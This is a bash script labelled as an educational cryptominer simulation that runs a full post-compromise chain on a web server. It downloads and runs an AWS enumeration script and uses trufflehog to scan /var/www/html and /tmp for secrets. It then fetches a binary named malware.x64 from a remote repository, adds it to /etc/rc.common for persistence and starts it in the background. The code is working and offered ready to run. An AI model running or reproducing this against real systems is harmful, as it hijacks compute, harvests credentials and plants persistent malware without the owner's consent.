#!/usr/bin/bash
# Cryptominer Payload - Educational Security Simulation
# WARNING: This is a SIMULATION for demonstration purposes only!

set -e

# Step 1: AWS enumeration (if Python is available)
if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
    echo "[+] Running AWS enumeration..."
    ENUM_SCRIPT=$(mktemp)
    curl -s -o "$ENUM_SCRIPT" http://localhost/enumerate_aws.py 2>/dev/null || \
    wget -q -O "$ENUM_SCRIPT" http://localhost/enumerate_aws.py 2>/dev/null || true
    
    if [ -s "$ENUM_SCRIPT" ]; then
        chmod +x "$ENUM_SCRIPT"
        python3 "$ENUM_SCRIPT" 2>/dev/null || python "$ENUM_SCRIPT" 2>/dev/null || true
        rm -f "$ENUM_SCRIPT"
    else
        echo "[!] Could not download enumeration script"
    fi
else
    echo "[!] Python not available, skipping AWS enumeration"
fi

# Step 2: Download and run trufflehog for secret scanning
echo "[+] Downloading trufflehog for filesystem scanning..."
TRUFFLEHOG_URL="https://github.com/trufflesecurity/trufflehog/releases/download/v3.63.2/trufflehog_3.63.2_linux_amd64.tar.gz"
TRUFFLEHOG_DIR=$(mktemp -d)

if curl -sL "$TRUFFLEHOG_URL" -o "$TRUFFLEHOG_DIR/trufflehog.tar.gz" 2>/dev/null; then
    echo "[+] Extracting trufflehog..."
    tar -xzf "$TRUFFLEHOG_DIR/trufflehog.tar.gz" -C "$TRUFFLEHOG_DIR" 2>/dev/null || true
    
    if [ -f "$TRUFFLEHOG_DIR/trufflehog" ]; then
        echo "[+] Running trufflehog filesystem scan..."
        chmod +x "$TRUFFLEHOG_DIR/trufflehog"
        "$TRUFFLEHOG_DIR/trufflehog" filesystem /var/www/html --no-update 2>/dev/null || true
        "$TRUFFLEHOG_DIR/trufflehog" filesystem /tmp --no-update 2>/dev/null || true
    fi
    
    rm -rf "$TRUFFLEHOG_DIR"
else
    echo "[!] Could not download trufflehog"
fi

echo "[+] Downloading cryptominer binary..."
cd /var/www/html 2>/dev/null || cd /tmp
curl -OL https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64 2>/dev/null || \
wget -q https://raw.githubusercontent.com/safchain/dd-malware/main/malware.x64

echo "[+] Setting execution permissions..."
chmod +x malware.x64

echo "[+] Establishing persistence..."
MALWARE_PATH="$(pwd)/malware.x64"
echo "$MALWARE_PATH" >> /etc/rc.common 2>/dev/null || true

echo "[+] Starting cryptominer..."
"$MALWARE_PATH" --cpu-priority 44 &

echo "[+] Cryptominer deployment complete!"
echo "[+] Process running in background with PID: $!"
